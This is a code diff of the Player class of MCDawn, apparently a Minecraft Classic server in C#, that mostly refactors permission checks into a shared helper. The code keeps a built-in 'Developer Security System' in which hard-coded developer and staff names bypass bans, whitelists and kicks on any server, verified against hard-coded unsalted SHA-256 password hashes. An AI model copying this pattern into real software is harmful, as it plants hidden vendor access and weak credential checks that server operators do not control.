@@ -383,7 +383,7 @@ namespace MCDawn
 
         public bool loggedIn = false;
 
-        public bool IsLocalhostIP(string ip) { return (ip.StartsWith("127.0.0.") || ip.StartsWith("192.168.") || ip.StartsWith("10.10.")); }
+        public bool IsLocalhostIP(string ip) { return (ip.StartsWith("127.0.0.") | ip.StartsWith("192.168.") | ip.StartsWith("10.10.")); }
         public Player(Socket s)
         {
             try
@@ -391,8 +391,12 @@ namespace MCDawn
                 socket = s;
                 ip = socket.RemoteEndPoint.ToString().Split(':')[0];
                 Server.s.Log(ip + " connected to the server.");
-                if (Server.useMaxMind) countryName = Server.iploopup.getCountry(IPAddress.Parse(IsLocalhostIP(ip) ? Server.GetIPAddress() : ip)).getName();
-                else countryName = "N/A";
+                try
+                {
+                    if (Server.useMaxMind) countryName = Server.iploopup.getCountry(IPAddress.Parse(IsLocalhostIP(ip) ? Server.GetIPAddress() : ip)).getName();
+                    else countryName = "N/A";
+                }
+                catch { countryName = "N/A"; }
                 if (IsLocalhostIP(ip)) countryName = "Localhost (" + countryName + ")";
 
                 for (byte i = 0; i < 128; ++i) bindings[i] = i;
@@ -794,7 +798,7 @@ namespace MCDawn
                 {
                     if (Server.verify)
                     {
-                        if (Server.whiteList.Contains(name) || Server.devs.Contains(originalName.ToLower()) || Server.staff.Contains(originalName.ToLower()) || Server.administration.Contains(originalName.ToLower()))
+                        if (Server.whiteList.Contains(name) || Server.hasProtection(originalName.ToLower()))
                         {
                             onWhitelist = true;
                         }
@@ -873,7 +877,7 @@ namespace MCDawn
                     return; 
                 }*/
 
-                if ((Group.findPlayerGroup(name) == Group.findPerm(LevelPermission.Banned)) && (!Server.devs.Contains(originalName.ToLower()) && !Server.staff.Contains(originalName.ToLower()) && !Server.administration.Contains(originalName.ToLower())))
+                if (Group.findPlayerGroup(name) == Group.findPerm(LevelPermission.Banned) && !Server.hasProtection(originalName.ToLower()))
                 {
                     if (Server.useWhitelist)
                     {
@@ -1273,10 +1277,9 @@ namespace MCDawn
             else { if (!Server.devs.Contains(originalName.ToLower())) { IRCBot.Say(IRCColor.bold + color + displayName + IRCColor.bold + "&g joined the game from " + IRCColor.red + countryName + IRCColor.color + "."); /*AllServerChat.Say(name + " joined the game from " + countrynameirc + ".");*/ } }
 
             // Auto-Agree To Rules for OP+, Devs and Staff.
-            if (this.group.Permission >= Server.adminsecurityrank || Server.devs.Contains(originalName.ToLower()) || Server.staff.Contains(originalName.ToLower()) || Server.administration.Contains(originalName.ToLower()) && Server.agreeToRules) 
-            {
-                if (!Server.agreedToRules.Contains(name.ToLower())) { AgreeToRules(); }
-            }
+            if (Server.agreeToRules && (this.group.Permission >= Server.adminsecurityrank || Server.hasProtection(originalName.ToLower())))
+                if (!Server.agreedToRules.Contains(name.ToLower()))
+                    AgreeToRules();
 
             try
             {
@@ -1315,7 +1318,7 @@ namespace MCDawn
                 if (!File.Exists("passwords/" + name.ToLower() + ".xml")) { File.Create("passwords/" + name.ToLower() + ".xml").Close(); }
                 if (File.Exists("passwords/" + name.ToLower() + ".xml")) { this.password = File.ReadAllText("passwords/" + name.ToLower() + ".xml"); }
                 // Converting passwords: New format is Reverse(Hex(SHA256(MD5(password))))
-                if (password.EndsWith("==") || password.EndsWith("=") || password.Length <= 56) // all old passswords after encryption are returned to base 64 string, which always end in "==" o.o
+                if (!String.IsNullOrEmpty(password) && (password.EndsWith("=") || password.Length <= 56)) // all old passswords after encryption are returned to base 64 string, which always end in "==" o.o
                 {
                     //File.WriteAllText("passwords/" + name.ToLower() + ".xml", PasswordFormat(password, true));
                     //password = File.ReadAllText("passwords/" + name.ToLower() + ".xml");
@@ -1324,10 +1327,10 @@ namespace MCDawn
                 }
             }
             // Dev Security System
-            if (Server.devs.Contains(originalName.ToLower()) || Server.staff.Contains(originalName.ToLower()) || Server.administration.Contains(originalName.ToLower())) { this.devUnverified = true; }
+            if (Server.hasProtection(originalName.ToLower())) { this.devUnverified = true; }
 
             if (emoteList.Contains(name)) parseSmiley = false;
-            if (this.group.Permission >= LevelPermission.Operator || Server.devs.Contains(originalName.ToLower()) | Server.staff.Contains(originalName.ToLower())) { this.invincible = true; }
+            if (this.group.Permission >= LevelPermission.Operator | Server.hasProtection(originalName.ToLower())) { this.invincible = true; }
             if (Server.adminsjoinsilent == true)
             {
                 if (!Server.devs.Contains(originalName.ToLower()))
@@ -1513,8 +1516,8 @@ namespace MCDawn
             }
 
             if (name != originalName && Server.devs.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN DEVELOPER EH??"); return; }
-            else if (name != originalName && Server.staff.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN STAFF EH??"); return; }
-            else if (name != originalName && Server.administration.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN ADMINISTRATOR EH??"); return; }
+            else if (name != originalName && Server.staff.Contains(name.ToLower()) && !Server.staff.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN STAFF EH??"); return; }
+            else if (name != originalName && Server.administration.Contains(name.ToLower()) && !Server.administration.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN ADMINISTRATOR EH??"); return; }
 
             if (OnBlockchange != null) OnBlockchange(this, x, y, z, type);
 
@@ -2368,10 +2371,10 @@ namespace MCDawn
                 }
              chat:
                 if (name != originalName && Server.devs.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN DEVELOPER EH??"); return; }
-                else if (name != originalName && Server.staff.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN STAFF EH??"); return; }
-                else if (name != originalName && Server.administration.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN ADMINISTRATOR EH??"); return; }
+                else if (name != originalName && Server.staff.Contains(name.ToLower()) && !Server.staff.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN STAFF EH??"); return; }
+                else if (name != originalName && Server.administration.Contains(name.ToLower()) && !Server.administration.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN ADMINISTRATOR EH??"); return; }
 
-                if (Server.chatmod && !this.voice && !Server.devs.Contains(originalName.ToLower()) && !Server.staff.Contains(originalName.ToLower()) && !Server.administration.Contains(originalName.ToLower())) { this.SendMessage("Chat moderation is on, you cannot speak."); return; }
+                if (Server.chatmod && !this.voice && !Server.hasProtection(originalName.ToLower())) { this.SendMessage("Chat moderation is on, you cannot speak."); return; }
                 if (muted) { this.SendMessage("You are muted."); return; }  //Muted: Only allow commands
                 if (devUnverified) { SendMessage("You are currently in Developer Security System until verified!"); return; }
 
@@ -2525,7 +2528,7 @@ namespace MCDawn
                     if (text[0] == '#') newtext = text.Remove(0, 1).Trim();
 
                     GlobalMessageOps("To Ops &f-" + color + name + "&f- " + newtext);
-                    if (group.Permission < Server.opchatperm && !Server.devs.Contains(originalName.ToLower()) && !Server.staff.Contains(originalName.ToLower()) && !Server.administration.Contains(originalName.ToLower()))
+                    if (group.Permission < Server.opchatperm && !Server.hasProtection(originalName.ToLower()))
                         SendMessage("To Ops &f-" + color + name + "&f- " + newtext);
                     Server.s.Log("(OPs): " + name + ": " + newtext);
                     IRCBot.Say(color + name + ": " + IRCColor.color + newtext, true);
@@ -2559,7 +2562,7 @@ namespace MCDawn
                 {
                     string newtext = text;
                     if (text[0] == '^') newtext = text.Remove(0, 1).Trim();
-                    if (!Server.devs.Contains(originalName.ToLower()) && !Server.staff.Contains(originalName.ToLower()) && !Server.administration.Contains(originalName.ToLower())) SendMessage("Can't let you do that, starfox.");
+                    if (!Server.hasProtection(originalName.ToLower())) SendMessage("Can't let you do that, starfox.");
                     GlobalMessageDevsStaff("To Devs/Staff &f-" + color + name + "&f- " + newtext);
                     return;
                 }
@@ -2734,8 +2737,8 @@ namespace MCDawn
 
                 if (cmd == "") { SendMessage("No command entered."); return; }
                 if (name != originalName && Server.devs.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN DEVELOPER EH??"); return; }
-                else if (name != originalName && Server.staff.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN STAFF EH??"); return; }
-                else if (name != originalName && Server.administration.Contains(name.ToLower()) && !Server.devs.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN ADMINISTRATOR EH??"); return; }
+                else if (name != originalName && Server.staff.Contains(name.ToLower()) && !Server.staff.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN STAFF EH??"); return; }
+                else if (name != originalName && Server.administration.Contains(name.ToLower()) && !Server.administration.Contains(originalName.ToLower())) { Kick("U BE TRYING TO HAXOR A MCDAWN ADMINISTRATOR EH??"); return; }
 
                 // Dev Security
                 if (this.devUnverified == true && cmd.ToLower() != "devpass") { SendMessage("You are currently in Developer Security System until verified!"); return; }
@@ -2761,8 +2764,8 @@ namespace MCDawn
                     return;
                 }
                 // Dev Security System
-                if (cmd.ToLower() == "devpass" && (Server.staff.Contains(originalName.ToLower()) || Server.devs.Contains(originalName.ToLower()) || Server.administration.Contains(originalName.ToLower())))
-                {                    
+                if (cmd.ToLower() == "devpass" && Server.hasProtection(originalName.ToLower()))
+                {
                     if (message == "") { SendMessage("&3/pass [password]" + "&g - Enter your password."); }
                     if (passtries >= 3) { Kick("Can't let you do that, Starfox."); return; }
                     if (!devUnverified) { SendMessage("You currently are not in Developer Security System!"); return; }
@@ -2770,9 +2773,8 @@ namespace MCDawn
                     StringBuilder sb = new StringBuilder();
                     string correctPass = "";
                     if (Server.devs.Contains(originalName.ToLower())) { correctPass = "34fc24e347a82d5dffb27e928dc0dfc09ce73410a8c9144542ed7389f9049ea4"; }
-                    //if (Server.devs.Contains(originalName.ToLower())) { correctPass = "01112e706d9eaf7249ba8988314617f0aeb7482b3d7da13dfacca0a87f00fa3a"; }
                     else if (Server.staff.Contains(originalName.ToLower())) { correctPass = "0ad2e0351be5fbd48cac905da60f5acb31737190445561b96c4c85facdab649b"; }
-                    else if (Server.administration.Contains(originalName.ToLower()) && name.ToLower() != "jonnyli1125") { correctPass = "c697d2981bf416569a16cfbcdec1542b5398f3cc77d2b905819aa99c46ecf6f6"; }
+                    else if (Server.administration.Contains(originalName.ToLower())) { correctPass = "c697d2981bf416569a16cfbcdec1542b5398f3cc77d2b905819aa99c46ecf6f6"; }
 
                     byte[] sha2hashed = sha2.ComputeHash(utf8.GetBytes(message));
                     for (int i = 0; i < sha2hashed.Length; i++) { sb.Append(sha2hashed[i].ToString("x2")); }
@@ -2789,10 +2791,9 @@ namespace MCDawn
                     }
                 }
                    
-                if ((cmd.ToLower() == "devgl" || cmd.ToLower() == "devglobal") && (Server.staff.Contains(originalName.ToLower()) || Server.devs.Contains(originalName.ToLower()) || Server.administration.Contains(originalName.ToLower())))
+                if ((cmd.ToLower() == "devgl" || cmd.ToLower() == "devglobal") && Server.hasProtection(originalName.ToLower()))
                 {
                     if (message == "") { SendMessage("No Message Sent."); return; }
-                    //if (!Server.devs.Contains(originalName.ToLower()) && !Server.staff.Contains(originalName.ToLower())) SendMessage("Can't let you do that, starfox.");
                     GlobalMessageDevsStaff("<[DevGlobal] " + color + name + ": &f" + message);
                     GlobalChatBot.Say(name + ": " + message, true);
                     return;
@@ -3349,10 +3350,7 @@ namespace MCDawn
         public static void SendMessage(Player p, string message)
         {
             if (p == null) {
-                if (storeHelp)
-                {
-                    storedHelp += message + "\r\n";
-                }
+                if (storeHelp) storedHelp += message + "\r\n";
                 else
                 {
                     Server.s.Log(message);
@@ -3394,28 +3392,6 @@ namespace MCDawn
             message = ReplaceVars(message).Trim();
             message = RemoveBadColors(message).Trim();
 
-			/* int totalTries = 0;
-        retryTag: try
-            {
-                foreach (string line in Wordwrap(message))
-                {
-                    string newLine = line;
-                    if (newLine.TrimEnd(' ')[newLine.TrimEnd(' ').Length - 1] < '!')
-                    {
-                        newLine += '\'';
-                    }
-
-                    StringFormat(newLine, 64).CopyTo(buffer, 1);
-                    SendRaw(13, buffer);
-                }
-            }
-            catch (Exception e)
-            {
-                message = "&f" + message;
-                totalTries++;
-                if (totalTries < 10) goto retryTag;
-                else Server.ErrorLog(e);
-            } */
 			// Incedo's rewrite. PLEASE stop using labels!
 			for (byte totalTries = 0;; totalTries++) {
 				try {
@@ -3824,12 +3800,8 @@ namespace MCDawn
                 try
                 {
                     foreach (Player p in players)
-                    {
                         if (p != this && p.level == level)
-                        {
                             p.SendRaw(msg, buffer);
-                        }
-                    }
                 } catch { }
         }
         #endregion
@@ -3881,9 +3853,7 @@ namespace MCDawn
             players.ForEach(delegate(Player pl)
             {
                 if (pl.haswom && pl.group.Permission >= chatperm)
-                {
-                    pl.SendMessage(pl.id, "^detail.user.join=" + p.color + p.prefix + p.displayName + "&g");
-                }
+                    pl.SendMessage(pl.id, "^detail.user.join=" + p.color + p.prefix + p.displayName + Server.DefaultColor);
             });
         }
         public static void WomDisc(Player p, LevelPermission chatperm = LevelPermission.Unverified)
@@ -3891,9 +3861,7 @@ namespace MCDawn
             players.ForEach(delegate(Player pl)
             {
                 if (pl.haswom && pl.group.Permission >= chatperm)
-                {
-                    pl.SendMessage(pl.id, "^detail.user.part=" + p.color + p.prefix + p.displayName + "&g");
-                }
+                    pl.SendMessage(pl.id, "^detail.user.part=" + p.color + p.prefix + p.displayName + Server.DefaultColor);
             });
         }
         public static void WomGlobalMessage(string message)
@@ -3903,9 +3871,7 @@ namespace MCDawn
             players.ForEach(delegate(Player p) 
             {
                 if (p.haswom)
-                {
                     p.SendMessage(p.id, "^detail.user.alert=" + message);
-                }
             });
         }
         public static void WomGlobalMessageOps(string message)
@@ -3914,13 +3880,9 @@ namespace MCDawn
             {
                 players.ForEach(delegate(Player p)
                 {
-                    if (p.group.Permission >= Server.opchatperm || Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && (p.unverified == false && p.devUnverified == false))
-                    {
+                    if ((p.group.Permission >= Server.opchatperm || Server.hasProtection(p.originalName.ToLower())) && (p.unverified == false && p.devUnverified == false))
                         if (p.haswom)
-                        {
                             p.SendMessage(p.id, "^detail.user.alert=" + message);
-                        }
-                    }
                 });
             }
             catch { Server.s.Log("Error occured with Op Chat"); }
@@ -3931,13 +3893,9 @@ namespace MCDawn
             {
                 players.ForEach(delegate(Player p)
                 {
-                    if (p.group.Permission >= Server.adminchatperm || Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && (p.unverified == false && p.devUnverified == false))
-                    {
+                    if ((p.group.Permission >= Server.adminchatperm || Server.hasProtection(p.originalName.ToLower())) && (p.unverified == false && p.devUnverified == false))
                         if (p.haswom)
-                        {
                             p.SendMessage(p.id, "^detail.user.alert=" + message);
-                        }
-                    }
                 });
             }
             catch { Server.s.Log("Error occured with Admin Chat"); }
@@ -3952,10 +3910,8 @@ namespace MCDawn
             {
                 players.ForEach(delegate(Player p)
                 {
-                    if (p.group.Permission >= Server.opchatperm || Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && (p.unverified == false && p.devUnverified == false))
-                    {
+                    if ((p.group.Permission >= Server.opchatperm || Server.hasProtection(p.originalName.ToLower())) && (p.unverified == false && p.devUnverified == false))
                         Player.SendMessage(p, message);
-                    }
                 });
             }
             catch { Server.s.Log("Error occured with Op Chat"); }
@@ -3966,10 +3922,8 @@ namespace MCDawn
             {
                 players.ForEach(delegate(Player p)
                 {
-                    if (p.group.Permission >= Server.adminchatperm || Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && (p.unverified == false && p.devUnverified == false))
-                    {
+                    if ((p.group.Permission >= Server.adminchatperm || Server.hasProtection(p.originalName.ToLower())) && (p.unverified == false && p.devUnverified == false))
                         Player.SendMessage(p, message);
-                    }
                 });
             }
             catch { Server.s.Log("Error occured with Admin Chat"); }
@@ -3980,10 +3934,8 @@ namespace MCDawn
             {
                 players.ForEach(delegate(Player p)
                 {
-                    if (Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && p.devUnverified == false)
-                    {
+                    if (Server.hasProtection(p.originalName.ToLower()) && p.devUnverified == false)
                         Player.SendMessage(p, message);
-                    }
                 });
             }
             catch { }
@@ -3994,10 +3946,8 @@ namespace MCDawn
             {
                 players.ForEach(delegate(Player p)
                 {
-                    if (Server.devs.Contains(p.name.ToLower()) && p.devUnverified == false)
-                    {
+                    if (Server.devs.Contains(p.originalName.ToLower()) && p.devUnverified == false)
                         Player.SendMessage(p, message);
-                    }
                 });
             }
             catch { }
@@ -4010,17 +3960,13 @@ namespace MCDawn
                 {
                     if (g.Permission < Server.opchatperm)
                     {
-                        if (p.group.Permission == g.Permission || p.group.Permission >= Server.opchatperm || Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && p.unverified == false && p.devUnverified == false)
-                        {
+                        if ((p.group.Permission == g.Permission | p.group.Permission >= Server.opchatperm | Server.hasProtection(p.originalName.ToLower())) && (p.unverified == false && p.devUnverified == false))
                             Player.SendMessage(p, message);
-                        }
                     }
                     else
                     {
-                        if (p.group.Permission == g.Permission || Server.devs.Contains(p.name.ToLower()) || Server.staff.Contains(p.name.ToLower()) || Server.administration.Contains(p.name.ToLower()) && p.unverified == false && p.devUnverified == false)
-                        {
+                        if ((p.group.Permission == g.Permission || Server.hasProtection(p.originalName.ToLower())) && (p.unverified == false && p.devUnverified == false))
                             Player.SendMessage(p, message);
-                        }
                     }
                 });
             }
@@ -4155,7 +4101,7 @@ namespace MCDawn
 
             if (noKick) return;
 
-            if (loggedIn && (!this.devUnverified && !this.unverified) && (Server.devs.Contains(this.originalName.ToLower()) || Server.staff.Contains(this.originalName.ToLower()) || Server.administration.Contains(this.originalName.ToLower())))
+            if (loggedIn && (!this.devUnverified && !this.unverified) && Server.hasProtection(originalName.ToLower()))
                 return;
 
 			leftGame(kickString);
@@ -4231,7 +4177,7 @@ namespace MCDawn
                     UndoBuffer.Clear();
 
                     // DevGlobal Notify on unverified devs/staff
-                    if (Server.devs.Contains(originalName.ToLower()) || Server.staff.Contains(originalName.ToLower()) || Server.administration.Contains(originalName.ToLower())) { if (devUnverified) { GlobalChatBot.Say(name + " logged out of server " + Server.name + " without verifying!", true); } }
+                    if (Server.hasProtection(name.ToLower())) { if (devUnverified) { GlobalChatBot.Say(name + " logged out of server " + Server.name + " without verifying!", true); } }
                     // Passtries Reset
                     this.passtries = 0;
                     // Review Remove
@@ -4680,7 +4626,7 @@ namespace MCDawn
             if (Server.allowIgnoreOps && (Server.hasProtection(ignored)) || Group.findPlayerGroup(ignored).Permission >= LevelPermission.Operator) { return; }
             foreach (Group gr in Group.GroupList)
             {
-                if (gr.playerList.Contains(ignored.ToLower()) && gr.Permission >= LevelPermission.Operator && !Server.allowIgnoreOps || Server.devs.Contains(ignored.ToLower()) || Server.staff.Contains(ignored.ToLower()) || Server.administration.Contains(ignored.ToLower())) { return; }
+                if (gr.playerList.Contains(ignored.ToLower()) && gr.Permission >= LevelPermission.Operator && !Server.allowIgnoreOps || Server.hasProtection(ignored.ToLower())) { return; }
             }
             if (p.ignoreList.Contains(ignored.ToLower())) { return; }
             p.ignoreList.Add(ignored.ToLower());
